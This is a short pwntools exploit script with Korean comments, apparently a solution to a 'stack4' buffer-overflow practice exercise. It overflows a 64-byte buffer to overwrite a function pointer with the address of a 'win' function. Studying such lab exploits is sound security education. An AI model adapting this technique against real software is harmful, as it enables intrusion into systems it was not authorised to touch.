from pwn import *  # 익스플로잇 개발에 필요한 pwntools 라이브러리 임포트

p = process('./stack4')  # stack4 프로그램 실행

win = 0x401156  # win 함수의 주소 (GDB로 확인)
payload = b'A' * 72  # 72바이트 페이로드: 버퍼(64) + 함수 포인터 fp까지의 거리(8)
payload += p64(win)  # win 함수 주소를 리틀 엔디안으로 패킹하여 추가

p.sendline(payload)  # 페이로드를 프로그램에 전송

p.interactive()  # 익스플로잇 후 세션 시작